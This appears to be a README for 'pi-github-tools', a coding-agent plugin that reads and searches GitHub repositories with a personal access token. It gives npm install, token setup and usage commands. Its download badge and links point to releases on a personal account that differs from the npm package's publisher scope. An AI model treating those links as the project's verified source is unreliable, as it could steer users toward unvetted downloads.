---
layout: "default"
title: "🎉 pi-github-tools - Easy Tools for GitHub Access"
description: "🔍 Explore and manage GitHub repositories seamlessly from pi with essential tools for reading and searching, powered by a personal access token."
---
# 🎉 pi-github-tools - Easy Tools for GitHub Access

[![Download pi-github-tools](https://img.shields.io/badge/Download-pi--github--tools-blue)](https://github.com/yashlathiya2626/pi-github-tools/releases)

## 🚀 Getting Started

Welcome to **pi-github-tools**! This tool helps you read, search, and explore GitHub repositories easily from your pi-coding-agent. You don’t need advanced skills to use this tool. Just follow these simple steps to install and set it up.

## 📥 Download & Install

To get started, visit this page to download the latest version of **pi-github-tools**: [Download Here](https://github.com/yashlathiya2626/pi-github-tools/releases). 

Choose the appropriate version for your needs and follow the installation instructions below.

### Installation Steps

1. **Using pi**: Open your terminal and run the following command:

   ```bash
   pi install npm:@prinova/pi-github-tools
   ```

   This will install the tool directly to your pi environment.

2. **Using npm**: Alternatively, you can install it globally using npm. If you have npm installed, run:

   ```bash
   npm install -g @prinova/pi-github-tools
   ```

### ✔️ Verify Installation

To check if the installation was successful, run this command in your terminal:

```bash
pi-github-tools --version
```

If it shows the version number, you are ready to go!

## 🔑 Setup Your Personal Access Token (PAT)

This tool requires a GitHub Personal Access Token (PAT) to interact with the GitHub API. You can provide your token in one of two ways:

### Option 1: Use Environment Variable (GITHUB_PAT)

For most users, setting an environment variable is the easiest way. Run this command in your terminal:

```bash
export GITHUB_PAT=ghp_your_token_here
```

Be sure to replace `ghp_your_token_here` with your actual GitHub PAT.

### Option 2: Use a File Path (GITHUB_PAT_FILE)

If you prefer storing your token in a file, you can do that as well. This option is useful for systems like NixOS or Docker where secrets are often stored in files. Here’s what to do:

1. Create a text file that contains only your token.
2. Set the environment variable like this:

   ```bash
   export GITHUB_PAT_FILE=/path/to/github_token.txt
   ```

Make sure the file contains only the token, and check for any extra spaces or newlines. This method works well for:

- NixOS automatic deployments
- Docker secrets mounted as files
- Kubernetes secrets
- systemd configurations

## 🛠️ Using pi-github-tools

Now that you have installed and set up your token, you can start using **pi-github-tools**. Here’s how to perform common tasks:

### Searching Repositories

To search for repositories, open your terminal and type:

```bash
pi-github-tools search "repository-name"
```

Replace `repository-name` with the name you want to search for. The tool will return a list of matching repositories.

### Reading Repository Information

To read repository details, use the command:

```bash
pi-github-tools info "owner/repo"
```

Replace `owner/repo` with the actual repository path. This command provides details such as the README, stars, and contributions.

### Exploring Repository Issues

You can also view issues in a repository. Use:

```bash
pi-github-tools issues "owner/repo"
```

This command lists open and closed issues for the specified repository. It’s a great way to see what challenges users face or how you can contribute.

## ⚙️ System Requirements

This tool is lightweight and works well on most systems. Ensure you have the following:

- A computer running a compatible version of **Linux** or **Windows**.
- **Node.js** installed (preferred version: 14.x or later).
- An internet connection to access the GitHub API.

## 💬 Help and Support

If you run into issues or have questions, please check the [issues section](https://github.com/yashlathiya2626/pi-github-tools/issues) of the project. You can also reach out through discussions on GitHub for community support.

## 📅 Future Features

We plan to add more features in future updates, including:

- Enhanced GUI for easier navigation
- Support for private repositories
- Advanced search filters

Stay tuned for updates by checking our [Releases page](https://github.com/yashlathiya2626/pi-github-tools/releases) regularly.

## 📝 License

This project is licensed under the MIT License. You are free to use and modify it as per your needs. For further details, check the LICENSE file in the repository.

Enjoy using **pi-github-tools** for your GitHub needs!